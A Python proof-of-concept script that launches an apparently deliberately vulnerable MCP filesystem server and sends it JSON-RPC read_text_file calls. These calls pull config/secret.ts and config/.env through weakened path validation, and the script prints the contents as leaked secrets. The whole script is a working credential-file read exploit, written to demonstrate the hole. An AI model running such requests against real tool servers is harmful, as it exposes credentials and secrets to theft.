#!/usr/bin/env python3
"""
Proof of Concept: Hardcoded Secret Leak Vulnerability
Demonstrates how weakened path validation and exposed project root allow access to
hardcoded secrets stored in config/secret.ts and config/.env files.

This script:
1. Launches the vulnerable server as a subprocess
2. Sends JSON-RPC requests to read sensitive configuration files
3. Displays the leaked secrets to demonstrate the vulnerability
"""

import subprocess
import json
import sys
import os
import platform
import time

# Determine the server path
server_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "dist", "index.js")
if not os.path.exists(server_path):
    # Fallback: try running with tsx if available
    server_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "index.ts")
    node_cmd = ["npx", "tsx", server_path]
else:
    node_cmd = ["node", server_path]

# Files containing hardcoded secrets
secret_files = [
    "./config/secret.ts",
    "./config/.env"
]

print("[*] Starting vulnerable MCP Filesystem Server...")
print(f"[*] Server command: {' '.join(node_cmd)}")
print(f"[*] Target files containing secrets:")
for f in secret_files:
    print(f"    - {f}")
print()

# Launch the server process
try:
    server_process = subprocess.Popen(
        node_cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        cwd=os.path.dirname(os.path.dirname(__file__))  # Run from project root
    )
except Exception as e:
    print(f"[!] Error starting server: {e}")
    print(f"[!] Make sure Node.js is installed and the server is built (run 'npm run build')")
    sys.exit(1)

# Wait a moment for server to initialize
time.sleep(1)

# Send initialization request
init_request = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {
            "name": "poc-client",
            "version": "1.0.0"
        }
    }
}

print("[*] Sending initialize request...")
server_process.stdin.write(json.dumps(init_request) + "\n")
server_process.stdin.flush()

# Read initialization response
try:
    init_response = server_process.stdout.readline()
    if init_response:
        print(f"[+] Server initialized: {init_response.strip()[:100]}...")
except Exception as e:
    print(f"[!] Error reading init response: {e}")

# Send initialized notification
initialized_notification = {
    "jsonrpc": "2.0",
    "method": "notifications/initialized"
}
server_process.stdin.write(json.dumps(initialized_notification) + "\n")
server_process.stdin.flush()

time.sleep(0.5)

# Exploit: Read each secret file
leaked_secrets = {}

for secret_file in secret_files:
    print(f"\n{'='*70}")
    print(f"[*] Attempting to read: {secret_file}")
    print("[!] VULNERABILITY: This file should be protected but isn't due to weakened path validation")
    print()
    
    exploit_request = {
        "jsonrpc": "2.0",
        "id": len(leaked_secrets) + 2,  # Start from 2 (1 was initialize)
        "method": "tools/call",
        "params": {
            "name": "read_text_file",
            "arguments": {
                "path": secret_file
            }
        }
    }
    
    server_process.stdin.write(json.dumps(exploit_request) + "\n")
    server_process.stdin.flush()
    
    # Read the response
    try:
        response_line = server_process.stdout.readline()
        if response_line:
            response = json.loads(response_line)
            
            if "result" in response:
                print(f"[+] EXPLOIT SUCCESSFUL - Secrets leaked from {secret_file}:")
                print("-" * 70)
                
                # Extract content from response
                content = None
                if "content" in response["result"]:
                    content_data = response["result"]["content"]
                    if isinstance(content_data, list) and len(content_data) > 0:
                        if "text" in content_data[0]:
                            content = content_data[0]["text"]
                        elif isinstance(content_data[0], str):
                            content = content_data[0]
                    elif isinstance(content_data, str):
                        content = content_data
                elif "structuredContent" in response["result"]:
                    sc = response["result"]["structuredContent"]
                    if "content" in sc:
                        content = sc["content"]
                
                if content:
                    print(content)
                    leaked_secrets[secret_file] = content
                    print("-" * 70)
                    print(f"[!] VULNERABILITY CONFIRMED: Server allowed access to {secret_file}")
                else:
                    print("[?] No content found in response")
                    print(f"Response: {json.dumps(response, indent=2)}")
                    
            elif "error" in response:
                print(f"[!] Server returned error: {response['error']}")
                print(f"     This might indicate the file doesn't exist or access was denied")
            else:
                print(f"[?] Unexpected response: {json.dumps(response, indent=2)}")
        else:
            print("[!] No response received from server")
    except json.JSONDecodeError as e:
        print(f"[!] Error parsing response: {e}")
        print(f"[!] Raw response: {response_line}")
    except Exception as e:
        print(f"[!] Error reading response: {e}")
    
    time.sleep(0.3)  # Small delay between requests

# Summary
print(f"\n{'='*70}")
print("[*] EXPLOIT SUMMARY")
print(f"{'='*70}")
print(f"[!] Total files accessed: {len(leaked_secrets)}")
if leaked_secrets:
    print("\n[!] LEAKED SECRETS:")
    for file_path, content in leaked_secrets.items():
        print(f"\n  File: {file_path}")
        print(f"  Content preview (first 200 chars):")
        print(f"  {content[:200]}...")
    print("\n[!] VULNERABILITY CONFIRMED: Hardcoded Secret Leak")
    print("[!] This demonstrates how exposed configuration files can leak sensitive credentials")
    print("[!] Attack Surface: MCP Configuration Surface + Resource Layer")
else:
    print("[!] No secrets were successfully leaked")

# Clean up
server_process.terminate()
try:
    server_process.wait(timeout=2)
except subprocess.TimeoutExpired:
    server_process.kill()

print()
print("[*] POC completed")

